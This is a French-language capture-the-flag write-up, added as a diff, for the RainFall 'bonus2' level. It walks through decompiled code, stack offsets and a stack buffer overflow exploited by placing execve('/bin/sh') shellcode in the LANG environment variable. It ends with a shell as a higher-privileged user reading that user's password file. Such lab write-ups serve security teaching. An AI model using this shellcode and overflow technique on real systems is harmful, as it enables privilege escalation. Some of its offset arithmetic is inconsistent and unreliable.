@@ -1,0 +1,211 @@
+Bonus2 - Buffer Overflow avec Variable d'Environnement
+📋 Analyse et Recherche
+Reconnaissance initiale
+bashbonus2@RainFall:~$ ls -l
+total 8
+-rwsr-s---+ 1 bonus3 users 5664 Mar  6  2016 bonus2
+
+bonus2@RainFall:~$ ./bonus2
+bonus2@RainFall:~$ ./bonus2 arg1
+bonus2@RainFall:~$ ./bonus2 arg1 arg2
+Hello arg1
+Observations :
+
+Programme SUID qui appartient à bonus3
+Nécessite exactement 2 arguments
+Affiche "Hello" suivi du premier argument
+
+Analyse du code source
+Fonction main()
+cint main(int argc, char **argv)
+{
+    char local_60[40];    // Buffer pour argv[1]
+    char acStack_38[36];  // Buffer pour argv[2]
+    char *local_14;
+    
+    if (argc == 3) {
+        // Copie des arguments avec limitation de taille
+        strncpy(local_60, argv[1], 0x28);     // 40 bytes max
+        strncpy(acStack_38, argv[2], 0x20);   // 32 bytes max
+        
+        // Détection de la langue via LANG
+        local_14 = getenv("LANG");
+        if (local_14 != NULL) {
+            if (memcmp(local_14, "fi", 2) == 0) {
+                language = 1;  // Finnois
+            }
+            else if (memcmp(local_14, "nl", 2) == 0) {
+                language = 2;  // Néerlandais
+            }
+        }
+        
+        // Copie vers la pile (point critique)
+        char *src = local_60;
+        int *dest = (int*)&stack0xffffff50;
+        for (i = 0x13; i != 0; i--) {  // 19 itérations = 76 bytes
+            *dest = *(int*)src;
+            src += 4;
+            dest += 1;
+        }
+        
+        greetuser();
+    }
+    return 1;
+}
+Fonction greetuser()
+cvoid greetuser(void)
+{
+    char local_4c[4];   // Buffer de 4 bytes
+    int local_48;       // 4 bytes supplémentaires  
+    char local_44[64];  // Buffer principal de 64 bytes
+    
+    // Construction du message selon la langue
+    if (language == 1) {
+        // Finnois : "Hyvää päivää " (13 caractères)
+        strcpy(local_4c, "Hyv");
+        local_4c[3] = 0xC3;
+        local_48 = 0x20A4C3A4;  // "ää "
+        strcpy(local_44, "päivää ");
+    }
+    else if (language == 2) {
+        // Néerlandais : "Goedemiddag! " (13 caractères)
+        strcpy(local_4c, "Goed");
+        local_48 = 0x64696D65;  // "emid"
+        strcpy(local_44, "dag! ");
+    }
+    else {
+        // Anglais par défaut : "Hello " (6 caractères)
+        strcpy(local_4c, "Hell");
+        local_48 = 0x206F;      // "o "
+    }
+    
+    // POINT CRITIQUE : Concaténation sans vérification
+    strcat(local_4c, &stack0x00000004);
+    puts(local_4c);
+}
+Points théoriques clés
+1. Structure de la pile dans greetuser()
+┌─────────────────┐ ← Adresse haute
+│ ADRESSE RETOUR  │ ← Cible de l'overflow
+├─────────────────┤
+│   local_44[64]  │ ← 64 bytes
+├─────────────────┤
+│   local_48[4]   │ ← 4 bytes
+├─────────────────┤
+│   local_4c[4]   │ ← Point de départ du strcat()
+└─────────────────┘ ← Adresse basse
+Distance totale : 4 + 4 + 64 = 72 bytes jusqu'à l'adresse de retour
+2. Impact de la variable LANG
+
+LANG != "fi" et != "nl" : Préfixe "Hello " = 6 caractères
+LANG = "fi" : Préfixe "Hyvää päivää " = 13 caractères
+LANG = "nl" : Préfixe "Goedemiddag! " = 13 caractères
+
+3. Calcul des offsets nécessaires
+Pour atteindre l'adresse de retour depuis le début du buffer local_4c :
+
+Distance : 72 bytes
+Avec LANG=0 : Besoin de 72 - 6 = 66 bytes de payload
+Avec LANG=fi/nl : Besoin de 72 - 13 = 59 bytes de payload
+
+🔍 Compréhension de l'Exploit
+Pourquoi "Hello" ne suffit pas
+Avec LANG par défaut (language = 0) :
+Payload maximum disponible : 40 + 32 = 72 bytes
+Préfixe "Hello " : 6 bytes
+Données utilisateur : 72 - 6 = 66 bytes pour atteindre l'adresse de retour
+Problème : Il faut exactement 66 bytes pour atteindre l'adresse de retour, mais pas la dépasser suffisamment pour l'écraser.
+Pourquoi LANG=fi/nl fonctionne
+Avec LANG=fi ou LANG=nl :
+Payload maximum : 72 bytes
+Préfixe "Hyvää päivää " ou "Goedemiddag! " : 13 bytes
+Données utilisateur : 72 - 13 = 59 bytes pour atteindre l'adresse de retour
+Overflow : 72 - 59 = 13 bytes dépassent et écrasent l'adresse de retour ✓
+Technique d'injection via variable d'environnement
+Au lieu d'injecter le shellcode dans les arguments (limités à 72 bytes), on utilise la variable LANG :
+bashexport LANG="nl" + NOPs + shellcode
+Avantages :
+
+Espace quasi-illimité pour le shellcode
+Adresse mémoire relativement stable
+Le programme lit seulement les 2 premiers caractères ("nl")
+Le reste (NOPs + shellcode) reste en mémoire
+
+🎯 Calcul des Offsets et Adresses
+Offset pour écraser EIP
+Avec LANG=nl, pour écraser l'adresse de retour :
+
+Arguments totaux : 40 + 32 = 72 bytes
+Préfixe "Goedemiddag! " : 13 bytes
+Position de l'adresse de retour : bytes 60-63 du payload final
+
+Trouver l'adresse de la variable LANG
+gdb(gdb) break greetuser
+(gdb) run arg1 arg2
+(gdb) x/50s *((char**)environ)
+# Parcourir jusqu'à trouver LANG=nl...
+# Noter l'adresse, par exemple : 0xbffffee6
+Calcul de l'adresse du shellcode :
+
+Adresse LANG : 0xbffffee6
+Offset "nl" : +2 bytes
+Début des NOPs : 0xbffffee6 + 2 = 0xbffffee8
+
+⚡ Exploitation de la Faille
+Étape 1 : Préparation de l'environnement
+bash# Injection du shellcode dans LANG
+export LANG=$(python -c 'print("nl" + "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
+Composition :
+
+"nl" : Active le mode néerlandais
+"\x90" * 100 : NOP sled pour absorber les variations d'adresse
+"\x6a\x0b..." : Shellcode execve("/bin/sh")
+
+Étape 2 : Localisation du shellcode
+gdb(gdb) break main+125  # Après getenv()
+(gdb) run arg1 arg2
+(gdb) x/20s *((char**)environ)
+# Chercher LANG et noter son adresse
+# Exemple : 0xbffffee6
+Étape 3 : Calcul de l'adresse cible
+bash# Si LANG est à 0xbffffee6
+# Shellcode commence à : 0xbffffee6 + 2 + quelques NOPs
+# Adresse sûre : 0xbffffee6 + 50 = 0xbfffff18
+Étape 4 : Construction du payload final
+bash# Structure : [40 bytes arg1] + [23 bytes padding + adresse_retour + padding]
+./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 23 + "\x18\xff\xff\xbf"')
+Décomposition :
+
+"A" * 40 : Remplit complètement argv[1]
+"B" * 23 : Padding jusqu'à l'adresse de retour
+"\x18\xff\xff\xbf" : Adresse du shellcode (little endian)
+
+Étape 5 : Exploitation complète
+bashbonus2@RainFall:~$ export LANG=$(python -c 'print("nl" + "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
+
+bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 23 + "\x18\xff\xff\xbf"')
+Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBB�
+$ id
+uid=2011(bonus2) gid=2011(bonus2) euid=2012(bonus3) egid=100(users) groups=2012(bonus3),100(users),2011(bonus2)
+$ cat /home/user/bonus3/.pass
+[FLAG_BONUS3]
+🔑 Points Clés de l'Exploit
+Innovation technique
+
+Double buffer : Utilisation des arguments ET de l'environnement
+Bypass de limitation : Contournement de la limite de 72 bytes des arguments
+Langue comme vecteur : Exploitation de la logique métier pour l'overflow
+
+Sécurité et mitigations
+
+ASLR : L'utilisation de NOPs compense les variations d'adresse
+NX bit : Non présent sur ce système, permettant l'exécution de shellcode
+Stack canaries : Absents, permettant l'overflow direct
+
+Leçons apprises
+
+Validation insuffisante : strcat() sans vérification de taille
+Logique métier exploitable : La détection de langue devient un vecteur d'attaque
+Environnement comme vecteur : Les variables d'environnement sont souvent négligées
+
+Cet exploit démontre comment une fonctionnalité légitime (internationalisation) peut devenir un vecteur d'attaque sophistiqué en combinaison avec un buffer overflow classique.
